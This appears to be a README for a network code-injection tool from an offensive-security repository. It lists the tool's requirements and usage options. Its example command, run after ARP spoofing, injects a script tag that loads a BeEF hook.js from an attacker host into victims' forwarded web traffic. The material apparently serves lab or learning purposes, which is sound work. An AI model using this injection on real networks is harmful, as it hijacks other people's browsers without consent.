# Code injector

## Requirements

* Root access
* Python 3
* Scapy
* NetfilterQueue
* BeEF

## Usage

```shell
usage: code_injector.py [-h] [-d DESTINATION] [-c CODE]

optional arguments:
  -h, --help            show this help message and exit
  -d DESTINATION, --destination DESTINATION
                        Destination (sslstrip, forward, local)
  -c CODE, --code CODE  Code to inject
```

### Example

Using BeEF (start [ARPSpoofer](../arp_spoofer/arp_spoofer.py) first):
```shell
kali:~$ sudo python3 code_injector.py -d forward -c '<script src="http://192.168.122.108:3000/hook.js"></script>'
```

## Troubleshooting

* [ImportError on NetfilterQueue](https://github.com/tymyrddin/ymrir/wiki/netfilterqueue.md)
* [ImportError on Scapy](https://github.com/tymyrddin/ymrir/wiki/scapy.md)
* [BeEF unable to load extensions](https://github.com/tymyrddin/ymrir/wiki/beef.md)
